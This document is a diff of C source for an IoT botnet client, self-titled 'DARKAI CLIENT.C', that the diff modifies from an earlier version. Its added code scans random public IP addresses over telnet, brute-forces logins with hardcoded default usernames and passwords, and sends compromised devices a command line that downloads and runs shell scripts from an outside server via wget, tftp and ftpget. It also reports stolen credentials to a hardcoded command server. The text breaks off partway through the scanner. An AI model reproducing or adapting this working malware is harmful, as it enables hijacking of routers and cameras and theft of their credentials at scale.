@@ -1,8 +1,20 @@
-//     ___      __ _
-//    /   \___ / _(_)_ __   ___  ___
-//   / /\ / _ \ |_| | '_ \ / _ \/ __|
-//  / /_//  __/  _| | | | |  __/\__ \
-// /___,' \___|_| |_|_| |_|\___||___/
+/*
+Skype: b1narythag0d
+XMPP: b1nary@nigge.rs
+Made Date: 7-26-16
+*/
+/*
+				*** DO NOT LEAK THIS SHIT ITS PRIVATE AF ***
+
+# ___     __________  ____ _______      _____ _______________.___.  ___
+# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\
+# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/
+#           |    |   \ |   /    |    \/    |    \    |   \\____   |
+#           |______  / |___\____|__  /\____|__  /____|_  // ______|
+#                  \/              \/         \/       \/ \/
+
+						*** DARKAI CLIENT.C ***
+*/
 
 #define PR_SET_NAME 15
 #define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
@@ -15,12 +27,9 @@
 #define CMD_DO    253
 #define CMD_DONT  254
 #define OPT_SGA   3
-
-//   _____            _           _
-//   \_   \_ __   ___| |_   _  __| | ___  ___
-//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
-// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
-// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/
+#define STD2_STRING "dts"
+#define STD2_SIZE 50
+#define BUFFER_SIZE 512
 
 #include <stdlib.h>
 #include <stdarg.h>
@@ -43,24 +52,43 @@
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
+#include <pthread.h>
 
-//    ___             __ _
-//   / __\___  _ __  / _(_) __ _
-//  / /  / _ \| '_ \| |_| |/ _` |
-// / /__| (_) | | | |  _| | (_| |
-// \____/\___/|_| |_|_| |_|\__, |
-//                         |___/
 
+
+
+char *infectline = "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
 unsigned char *commServer[] =
 {
-        "45.76.26.8:666"
+        "45.76.26.8:23"
 };
 
-//    ___                 _
-//   / __\   _ _ __   ___| |_(_) ___  _ __  ___
-//  / _\| | | | '_ \ / __| __| |/ _ \| '_ \/ __|
-// / /  | |_| | | | | (__| |_| | (_) | | | \__ \
-// \/    \__,_|_| |_|\___|\__|_|\___/|_| |_|___/
+char *useragents[] = {
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
+        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
+        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
+        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
+        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
+        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
+        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
+};
+
 
 int initConnection();
 int getBogos(unsigned char *bogomips);
@@ -70,26 +98,15 @@ void makeRandomStr(unsigned char *buf, int length);
 int sockprintf(int sock, char *formatStr, ...);
 char *inet_ntoa(struct in_addr in);
 
-//    ___ _       _           _
-//   / _ \ | ___ | |__   __ _| |___
-//  / /_\/ |/ _ \| '_ \ / _` | / __|
-// / /_\\| | (_) | |_) | (_| | \__ \
-// \____/|_|\___/|_.__/ \__,_|_|___/
-
 int mainCommSock = 0, currentServer = -1, gotIP = 0;
 uint32_t *pids;
 uint32_t scanPid;
 uint64_t numpids = 0;
 struct in_addr ourIP;
 unsigned char macAddress[6] = {0};
-char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "cisco\0"};
-char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "vizxv\0", "cisco\0"};
 
-//    ___  ___  __      __  ___
-//   / __\/ _ \/__\  /\ \ \/ _ \
-//  / _\ / /_)/ \// /  \/ / /_\/
-// / /  / ___/ _  \/ /\  / /_\\
-// \/   \/   \/ \_/\_\ \/\____/
+char *usernames[] = {"root\0", "support\0", "guest\0", "ubnt\0"};
+char *passwords[] = {"root\0", "\0", "vizxv\0", "admin\0", "123\0", "1234\0", "12345\0", "123456\0", "support\0", "ubnt\0", "7ujMko0vizxv\0", "dreambox\0", "guest\0"};
 
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
@@ -120,12 +137,6 @@ uint32_t rand_cmwc(void)
         }
         return (Q[i] = r - x);
 }
-
-//        _   _ _
-//  /\ /\| |_(_) |___
-// / / \ \ __| | / __|
-// \ \_/ / |_| | \__ \
-//  \___/ \__|_|_|___/
 
 void trim(char *str)
 {
@@ -658,55 +669,79 @@ int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutu
         return 0;
 }
 
-//   _____  ___         _   _ _
-//   \_   \/ _ \  /\ /\| |_(_) |___
-//    / /\/ /_)/ / / \ \ __| | / __|
-// /\/ /_/ ___/  \ \_/ / |_| | \__ \
-// \____/\/       \___/ \__|_|_|___/
-
-static uint8_t ipState[5];
+static uint8_t ipState[5] = {0};
 in_addr_t getRandomPublicIP()
 {
-	if(ipState[1] < 255 && ipState[2] < 255 && ipState[3] < 255 && ipState[4] < 255)
+	    if(ipState[1] > 0 && ipState[4] < 255)
         {
-                ipState[1]++;
-		ipState[2]++;
-		ipState[3]++;
-		ipState[4]++;
-                char ip[16];
+                ipState[4]++;
+                char ip[16] = {0};
                 szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
-		return inet_addr(ip);
+                return inet_addr(ip);
         }
+		
+        ipState[0] = rand() % 255;
+        ipState[1] = rand() % 255;
+        ipState[2] = rand() % 255;
+        ipState[3] = rand() % 255;
 
-	ipState[1] = 0;
-	ipState[2] = 0;
-        ipState[3] = 0;
-	ipState[4] = 0;
         while(
-                (ipState[1] == 0) ||
-                (ipState[1] == 10) ||
-                (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
-                (ipState[1] == 127) ||
-                (ipState[1] == 169 && ipState[2] == 254) ||
-                (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
-                (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
-                (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
-                (ipState[1] == 192 && ipState[2] == 168) ||
-                (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
-                (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
-                (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
-                (ipState[1] >= 224)
-        )
+                (ipState[0] == 0) ||
+                (ipState[0] == 10) ||
+                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
+                (ipState[0] == 127) ||
+                (ipState[0] == 169 && ipState[1] == 254) ||
+                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
+                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
+                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
+                (ipState[0] == 192 && ipState[1] == 168) ||
+                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
+                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
+                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
+				(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 52) ||
+				(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 49) ||
+				(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 190) ||
+				(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 189) ||
+				(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 188) ||
+				(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 137) ||
+				(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 136) ||
+				(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 147) ||
+				(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 146) ||
+				(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 145) ||
+				(ipState[0] == 63 && ipState[1] == 141 && ipState[2] == 241) ||
+				(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 192) ||
+				(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 244) ||
+				(ipState[0] == 69 && ipState[1] == 197 && ipState[2] == 128) ||
+				(ipState[0] == 162 && ipState[1] == 251 && ipState[2] == 120) ||
+				(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 128) ||
+				(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 180) ||
+				(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 250) ||
+				(ipState[0] == 192 && ipState[1] == 187 && ipState[2] == 113) ||
+				(ipState[0] == 198 && ipState[1] == 204 && ipState[2] == 241) ||
+				(ipState[0] == 204 && ipState[1] == 10 && ipState[2] == 160) ||
+				(ipState[0] == 204 && ipState[1] == 12 && ipState[2] == 192) ||
+				(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 64) ||
+				(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 72) ||
+				(ipState[0] == 208 && ipState[1] == 67) ||
+				(ipState[0] == 94 && ipState[1] == 102 && ipState[2] == 48) ||
+				(ipState[0] == 93 && ipState[1] == 174 && ipState[2] == 88) ||
+				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 174) ||
+				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 172) ||
+				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 170) ||
+				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 169) ||
+				(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 160) ||
+                (ipState[0] >= 224)
+			)
         {
+                ipState[0] = rand() % 255;
                 ipState[1] = rand() % 255;
-        	ipState[2] = rand() % 255;
-        	ipState[3] = rand() % 255;
-		ipState[4] = rand() % 255;
+                ipState[2] = rand() % 255;
+                ipState[3] = rand() % 255;
         }
 
-	char ip[16];
-        szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
-	return inet_addr(ip);
+        char ip[16] = {0};
+        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
+        return inet_addr(ip);
 }
 
 in_addr_t getRandomIP(in_addr_t netmask)
@@ -771,14 +806,55 @@ int sclose(int fd)
         close(fd);
         return 0;
 }
+int socket_connect(char *host, in_port_t port){
+        struct hostent *hp;
+        struct sockaddr_in addr;
+        int on = 1, sock;     
 
-//  _____     _            _     __                                   _      _
-// /__   \___| |_ __   ___| |_  / _\ ___ __ _ _ __  _ __   ___ _ __  | | ___| |
-//   / /\/ _ \ | '_ \ / _ \ __| \ \ / __/ _` | '_ \| '_ \ / _ \ '__| | |/ _ \ |
-//  / / |  __/ | | | |  __/ |_  _\ \ (_| (_| | | | | | | |  __/ |    | |  __/ |
-//  \/   \___|_|_| |_|\___|\__| \__/\___\__,_|_| |_|_| |_|\___|_|    |_|\___|_|
+        if((hp = gethostbyname(host)) == NULL){
+                herror("gethostbyname");
+                exit(1);
+        }
+        bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
+        addr.sin_port = htons(port);
+        addr.sin_family = AF_INET;
+        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
 
-void StartTheLelz()
+        if(sock == -1){
+                perror("setsockopt");
+                exit(1);
+        }
+        
+        if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
+                perror("connect");
+                exit(1);
+
+        }
+        return sock;
+}
+
+void echoLoader()
+{
+        char buffer[BUFFER_SIZE];
+        int fd;
+        fd = socket_connect("0.0.0.0", 80); 
+        write(fd, "GET gtop.sh\r\n", strlen("GET gtop.sh\r\n")); // write(fd, char[]*, len);  
+        bzero(buffer, BUFFER_SIZE);
+        
+        while(read(fd, buffer, BUFFER_SIZE - 1) != 0){
+                FILE *f;
+                f = fopen("x", "a");
+                fprintf(f, "%s", buffer);
+                fclose(f);
+                bzero(buffer, BUFFER_SIZE);
+        }
+
+        shutdown(fd, SHUT_RDWR); 
+        close(fd);
+}
+
+void TelnetScanner()
 {
         int max = (getdtablesize() / 4) * 3, i, res;
         fd_set myset;
@@ -886,22 +962,56 @@ void StartTheLelz()
                         case 2:
                                 {
                                         if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
-					if(matchPrompt(fds[i].sockbuf)) {
-                        			fds[i].state = 7;
-                    			}
 
                                         if(readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                         {
                                                 fds[i].totalTimeout = 0;
                                                 fds[i].bufUsed = 0;
-                                                memset(fds[i].sockbuf, 0, 1024);
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+                                                else memset(fds[i].sockbuf, 0, 1024);
                                                 fds[i].state = 3;
                                                 continue;
-                                        } else {
+                                        }
+										else if(readUntil(fds[i].fd, "user:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										}
+										else if(readUntil(fds[i].fd, "name", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										}
+										else if(readUntil(fds[i].fd, "pass", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										}
+										else if(readUntil(fds[i].fd, "word", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										} else {
                                                 fds[i].bufUsed = strlen(fds[i].sockbuf);
                                         }
 
-                                        if(fds[i].totalTimeout + 30 < time(NULL))
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
                                         {
                                                 sclose(fds[i].fd);
                                                 fds[i].state = 0;
@@ -922,20 +1032,38 @@ void StartTheLelz()
                                 {
                                         if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
 
-                                        if(readUntil(fds[i].fd, "assword:", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                        if(readUntil(fds[i].fd, "pass", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                         {
                                                 fds[i].totalTimeout = 0;
                                                 fds[i].bufUsed = 0;
-                                                if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+                                                if(strstr(fds[i].sockbuf, "pass") != NULL) fds[i].state = 5;
                                                 else fds[i].state = 7;
                                                 memset(fds[i].sockbuf, 0, 1024);
                                                 continue;
-                                        } else {
-                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+                                        }
+										if(readUntil(fds[i].fd, "word", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "word") != NULL) fds[i].state = 5;
+												else fds[i].state = 7;
+												memset(fds[i].sockbuf, 0, 1024);
+												continue;
+										}
+											else {
+                                                if(strstr(fds[i].sockbuf, "invalid") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "incorrect") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "fail") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "again") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "wrong") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "accessdenied") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "denied") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "error") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "bad") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
                                                 fds[i].bufUsed = strlen(fds[i].sockbuf);
                                         }
 
-                                        if(fds[i].totalTimeout + 30 < time(NULL))
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
                                         {
                                                 sclose(fds[i].fd);
                                                 fds[i].state = 0;
@@ -954,22 +1082,96 @@ void StartTheLelz()
 
                         case 6:
                                 {
-                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
+                                    if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
 
-                                        if(readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
-                                        {
-                                                fds[i].totalTimeout = 0;
-                                                fds[i].bufUsed = 0;
-                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
-                                                if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
-                                                else fds[i].state = 7;
-                                                memset(fds[i].sockbuf, 0, 1024);
-                                                continue;
-                                        } else {
+                                    if(readUntil(fds[i].fd, "invalid", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                    {
+										fds[i].totalTimeout = 0;
+                                        fds[i].bufUsed = 0;
+                                        if(strstr(fds[i].sockbuf, "invalid") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+                                        if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                        else fds[i].state = 7;
+                                        memset(fds[i].sockbuf, 0, 1024);
+                                        continue;
+                                    }
+									if(readUntil(fds[i].fd, "incorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "incorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "fail", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "fail") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "again", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "again") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "wrong", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "wrong") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "accessdenied", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "accessdenied") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "denied", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "denied") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "error", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "error") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "bad", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "bad") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									else {
                                                 fds[i].bufUsed = strlen(fds[i].sockbuf);
-                                        }
+										}
 
-                                        if(fds[i].totalTimeout + 30 < time(NULL))
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
                                         {
                                                 sclose(fds[i].fd);
                                                 fds[i].state = 0;
@@ -978,37 +1180,527 @@ void StartTheLelz()
                                 }
                                 break;
 
-			case 7:
-				{
-					if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
-					fds[i].state = 8;
-				}
-				break;
-			
-			case 8:
-				{
-					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
-                    
-					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://45.76.26.8/gtop.sh;sh gtop.sh;busybox tftp -r tftp1.sh -g ; sh tftp1.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh;;exit\r\n", 275, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
-                    
-					if(fds[i].totalTimeout + 10 < time(NULL))
-					{
-						sclose(fds[i].fd);
-						fds[i].state = 0;
-						fds[i].complete = 1;
-					}
-				}
-				break;
-			}
-		}
-	}
+                        case 7:
+                                {
+                                    if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                    fds[i].state = 8;
+                                }
+                                break;
+								
+						case 8:
+								{
+										if(send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+										fds[i].state = 9;
+								}
+								break;
+
+                        case 9:
+                                {
+                                    if(send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.76.26.8/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 45.76.26.8 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.76.26.8; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.76.26.8 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+									sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+                                    fds[i].state = 10;
+                                }
+                                break;
+						case 10:
+								{
+									echoLoader();
+									send(fds[i].fd, "sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\r\n", 61, MSG_NOSIGNAL);
+									fds[i].state = 11;
+								}
+								break;
+						case 11:
+								{
+									if(send(fds[i].fd, "/bin/busybox;echo -e '\x67\x61\x79\x66\x67\x74'\r\n", 49, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+									fds[i].state = 12;
+								}
+
+                        case 12:
+                                {
+                                    if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
